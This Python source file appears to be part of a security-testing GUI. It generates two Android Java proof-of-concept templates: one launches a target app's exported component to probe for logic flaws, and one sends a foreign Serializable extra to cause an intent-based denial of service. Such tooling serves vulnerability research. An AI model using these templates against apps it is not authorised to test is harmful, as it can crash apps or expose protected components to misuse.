# coding=utf-8

class PocTool:
    def __init__(self):
        pass

    @staticmethod
    def generate_android_intent_logic_vul_poc(poc_panel):
        poc_panel.textctrl_poc.SetValue(
            '''public class MainActivity extends Activity {
    private static final String TAG = "MainActivity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        try {
            Intent intent = new Intent();
            intent.setComponent(new ComponentName(target_package_name, target_component_name));
            startActivity(intent);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}''')

    @staticmethod
    def generate_android_intent_dos_poc(poc_panel):
        poc_panel.textctrl_poc.SetValue(
            '''public class MainActivity extends Activity {
    private static final String TAG = "MainActivity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        try {
            Intent intent = new Intent();
            intent.setComponent(new ComponentName(target_package_name, target_component_name));
            intent.putExtra("serializable_key", new DataSchema());
            startActivity(intent);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

class DataSchema implements Serializable {
    private static final long serialVersionUID = -3601187837704976264L;
}''')